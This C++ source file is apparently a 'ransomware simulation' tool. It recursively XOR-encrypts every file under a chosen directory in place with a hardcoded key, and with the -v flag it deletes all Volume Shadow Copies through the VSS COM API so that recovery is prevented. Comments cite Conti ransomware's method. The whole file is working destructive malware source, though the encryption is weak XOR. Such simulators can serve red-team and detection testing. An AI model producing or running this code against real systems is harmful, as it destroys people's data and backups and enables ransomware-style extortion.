#include <windows.h>
#include <stdio.h>
// volume shadow copy deletion
#include <vss.h>
#include <vswriter.h>
#include <vsbackup.h>
#include <vsmgmt.h>
#include <atlcomcli.h>

#pragma comment (lib, "VssApi.lib")
#pragma comment (lib, "ResUtils.lib")

namespace {
	const char encKey[] = "123456789abcdefghijklmnopqrstuvwxyz";
    const int blockSize = 4096;
}

// single byte XOR encryption algorithm (signatures for single byte XOR can be signatured)
void xorEnc(char* buff, int buffSize, const char* key, int keySize) {
    for (int i = 0; i < buffSize; ++i) {
        buff[i] = buff[i] ^ key[i % keySize];
    }
}

// encrypt file using XOR
DWORD xorEncryptFile(LPCSTR path) {
	// Open the file handle
	// TODO: make logic to kill process, if file is open in another process
    HANDLE hFile = CreateFileA(path, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE)
    {
        char buf[256];
		FormatMessageA(FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS, NULL, GetLastError(), MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), buf, (sizeof(buf) / sizeof(wchar_t)), NULL);
        printf("[!] Failed to open file Error: %s\n", buf);
        return 1;
    }

    // chunk/block encrypt
	DWORD bytesRead = 0;
	DWORD bytesWritten = 0;
    LPVOID lpBuffer[blockSize];
    DWORD ret;
    while (true) {
        // save current file pointer position before read (could accomplish this with a position variable aswell)
        DWORD cPos = SetFilePointer(hFile, 0, NULL, FILE_CURRENT);
        if (cPos == INVALID_SET_FILE_POINTER) {
			char buf[256];
			FormatMessageA(FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS, NULL, GetLastError(), MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), buf, (sizeof(buf) / sizeof(wchar_t)), NULL);
			printf("[!] Failed to read file pointer Error: %s\n", buf);
			return 1;
        }

        // read bytes from target file
        ret = ReadFile(hFile, lpBuffer, sizeof(lpBuffer), &bytesRead, NULL);
        if (ret == 0) {
			char buf[256];
			FormatMessageA(FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS, NULL, GetLastError(), MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), buf, (sizeof(buf) / sizeof(wchar_t)), NULL);
			printf("[!] Failed to read to file Error: %s\n", buf);
			return 1;
        }
        // no more bytes read, file pointer reached end of file
        if (bytesRead == 0) {
            break;
        }

        // encrypt chunk bytes
        xorEnc((char *)lpBuffer, bytesRead, encKey, sizeof(encKey));

        // Set the file pointer back to the original position
        cPos = SetFilePointer(hFile, cPos, NULL, FILE_BEGIN);
        if (cPos == INVALID_SET_FILE_POINTER) {
			char buf[256];
			FormatMessageA(FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS, NULL, GetLastError(), MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), buf, (sizeof(buf) / sizeof(wchar_t)), NULL);
			printf("[!] Failed to set file pointer Error: %s\n", buf);
			return 1;
        }

        // write encrypted bytes to target file
        ret = WriteFile(hFile, lpBuffer, bytesRead, &bytesWritten, NULL);
        if (ret == 0) {
			char buf[256];
			FormatMessageA(FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS, NULL, GetLastError(), MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), buf, (sizeof(buf) / sizeof(wchar_t)), NULL);
			printf("[!] Failed to write to file Error: %s\n", buf);
			return 1;
        }
    }

    // close file handle
    CloseHandle(hFile);

    return 0;
}

// recursively encrypt directories
// no trailing forward slashes on path
DWORD xorEncryptFolder(LPCSTR directoryPath) {
    HANDLE hFind;
    WIN32_FIND_DATAA findFileData;

    // add wildcard pattern to the end of directory
    char pathPattern[MAX_PATH];
    sprintf_s(pathPattern, "%s\\*", directoryPath);

    // find first file in folder
    hFind = FindFirstFileA(pathPattern, &findFileData);
    if (hFind == INVALID_HANDLE_VALUE) {
		char buf[256];
		FormatMessageA(FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS, NULL, GetLastError(), MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), buf, (sizeof(buf) / sizeof(wchar_t)), NULL);
		printf("[!] Failed to find files in directory Error: %s\n", buf);
		return 1;
    }

    // iterate files in folder
    do {
		// append file/subdiretory to path
		char path[MAX_PATH];
		sprintf_s(path, "%s\\%s", directoryPath, findFileData.cFileName);

        if (findFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            // Skip "." and ".." directories
			if (strcmp(findFileData.cFileName, ".") == 0 || strcmp(findFileData.cFileName, "..") == 0) {
                continue;
			}

            // recursively call function
            xorEncryptFolder(path);
        }
        // all files not backed up with "Backup and Restore" have the FILE_ATTRIBUTE_ARCHIVE attribute
        else if ((findFileData.dwFileAttributes & FILE_ATTRIBUTE_NORMAL) || (findFileData.dwFileAttributes & FILE_ATTRIBUTE_ARCHIVE)) {
            // encrypt files
            xorEncryptFile(path);
            printf("[-] Encrypting file: %s\n", path);
        }
    } while (FindNextFileA(hFind, &findFileData));

    // close find handle
    FindClose(hFind);

    return 0;
}

// Delete Volume Shadow Copies through COM (cannot run as x86-on-x64(WOW64) and can only run in native x86 or x64)
// Reference: https://github.com/NUL0x4C/DeleteShadowCopies
// ! vss service does not support WOW64 since Windows Vista: https://learn.microsoft.com/en-ca/windows/win32/vss/volume-shadow-copy-service-portal
// conti uses CmdExec wmic.exe to succumvent this issue: https://github.com/gharty03/Conti-Ransomware/blob/e226ea77a59b6ed7815d6242c217a2220fb328fc/locker/locker.cpp#L241
DWORD deleteVolumeShadowCopies() {
	CComPtr<IVssBackupComponents> m_pVssObject;
	CComPtr<IVssEnumObject>	pIEnumSnapshots;
	VSS_OBJECT_PROP	Prop;
	VSS_SNAPSHOT_PROP&	Snap = Prop.Obj.Snap;
	HRESULT	hr	= S_OK;

	// initialize COM library STA
	hr = CoInitialize(NULL);
	if (hr != S_OK) {
		printf("[!] CoInitialize Failed : 0x%0.8X \n", hr);
		 return 1;
	}
	// register COM security layer
	hr = CoInitializeSecurity(NULL, -1, NULL, NULL, RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_DYNAMIC_CLOAKING, NULL );
	if (hr != S_OK) {
		printf("[!] CoInitializeSecurity Failed : 0x%0.8X \n", hr);
		 return 1;
	}

	// create VSS backup components interface
	hr = CreateVssBackupComponents(&m_pVssObject);
	if (hr == E_ACCESSDENIED){
		printf("[!] Please Run As Admin To Delete Shadow Copies \n");
		 return 1;
	}
	if (hr != S_OK) {
		printf("[!] CreateVssBackupComponents Failed : 0x%0.8X \n", hr);
		 return 1;
	}
	// initialize backup components metadata
	hr = m_pVssObject->InitializeForBackup();
	if (hr != S_OK) {
		printf("[!] InitializeForBackup Failed : 0x%0.8X \n", hr);
		 return 1;
	}
	// set context for shadow copy operations
	hr = m_pVssObject->SetContext(VSS_CTX_ALL);
	if (hr != S_OK){
		printf("[!] SetContext Failed : 0x%0.8X \n", hr);
		 return 1;
	}
	// define configuration for backup operations
	hr = m_pVssObject->SetBackupState(true, true, VSS_BT_FULL, false);
	if (hr != S_OK) {
		printf("[!] SetBackupState Failed : 0x%0.8X \n", hr);
		 return 1;
	}

	// query all shadow copies on the system
	hr = m_pVssObject->Query(GUID_NULL, VSS_OBJECT_NONE, VSS_OBJECT_SNAPSHOT, &pIEnumSnapshots);
	if (hr == VSS_E_OBJECT_NOT_FOUND) {
		printf("[-] There Is No Shadow Copies On This Machine \n");
		 return 1;
	}

	// iterate over shadow copies and delete
	while (TRUE){
		// next snapshot object (shadow copy)
		ULONG ulFetched;
		hr = pIEnumSnapshots->Next(1, &Prop, &ulFetched);
		if (ulFetched == 0) {
			printf("[-] No More Shadow Copies Were Detected \n");
			break;
		}
		// free snapshot properties
		VssFreeSnapshotPropertiesInternal(&Snap);

		// convert binary IDs to string GUIDs for logging
		WCHAR snapshotGuid[256];
		if (StringFromGUID2(Snap.m_SnapshotId, snapshotGuid, sizeof(snapshotGuid)) == 0) {
			printf("[!] GUID string buffer too smaller\n");
			return 1;
		}
		WCHAR providerGuid[256];
		if (StringFromGUID2(Snap.m_ProviderId, providerGuid, sizeof(snapshotGuid)) == 0) {
			printf("[!] GUID string buffer too smaller\n");
			return 1;
		}
		wprintf(L"[-] Deleting shadow copy: %s on %s from the provider: %s\n", snapshotGuid, Snap.m_pwszOriginalVolumeName, providerGuid);

		// delete snapshot
		LONG lSnapshots = 0;
		VSS_ID idNonDeletedSnapshotID = GUID_NULL;
		hr = m_pVssObject->DeleteSnapshots(Snap.m_SnapshotId, VSS_OBJECT_SNAPSHOT, FALSE, &lSnapshots, &idNonDeletedSnapshotID);
		if (hr != S_OK) {
			printf("[!] DeleteSnapshots Failed: 0x%0.8X \n", hr);
		}
	}

    return 0;
}

// print commandline usage
void printUsage() {
	printf(
		"Ransomware-Simulation.exe [-t target-path] [-v]\n"
		"	-t target-path # Target directory for encryption\n"
		"	-v             # Enable Volume Shadow Copy deletion\n"
	);
}

// TODO: add wincrypt.h and Advapi32.dll::SystemFunction032 encryption algorithms
// !needs to run in native 32bit or 64bit, cannot run under WOW64!
int main(int argc, char** argv)
{
	if (argc <= 1) {
		printf("[!] No arguments provided\n");
		printUsage();
	}

	// parse commandline arguments
	char* t_arg = NULL; // target path argument
	bool v_arg = false; // delete volume shadow copy argument
	for (int i = 1; i < argc; i++) {
		if (strcmp(argv[i], "-t") == 0 && i + 1 < argc) { // -t target-path
			t_arg = argv[i + 1];
			i++;
		}
		else if (strcmp(argv[i], "-v") == 0) { // -v
			v_arg = true;
		} 
		else {  // unknown flag
			printf("[!] Unknown option: %s\n", argv[i]);
			printUsage();
			return 1;
		}
	}

	if (t_arg != NULL) {
		xorEncryptFolder(t_arg);
	}
	if (v_arg) {
		deleteVolumeShadowCopies();
	}

	return 0;
}
